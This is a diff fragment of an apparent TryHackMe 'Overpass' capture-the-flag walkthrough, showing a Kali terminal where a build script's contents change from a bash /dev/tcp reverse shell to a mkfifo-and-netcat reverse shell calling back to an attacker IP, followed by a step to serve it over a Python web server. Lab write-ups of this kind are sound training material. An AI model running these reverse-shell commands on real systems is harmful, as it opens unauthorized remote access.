@@ -703,11 +703,8 @@ Open a new terminal and create the directory path `./downloads/src/` and the a
 └─$ vi buildscript.sh
 
 ┌──(kali㉿kali)-[~/…/THM/Overpass/downloads/src]
-└─$ vi buildscript.sh
-
-┌──(kali㉿kali)-[~/…/THM/Overpass/downloads/src]
 └─$ cat buildscript.sh                                           
-/bin/bash -i >& /dev/tcp/192.168.157.156/2222 0>&1
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.157.156 1234 >/tmp/f
 ```
 
 Start a python **webserver** on **port 80** on the attacker machine.
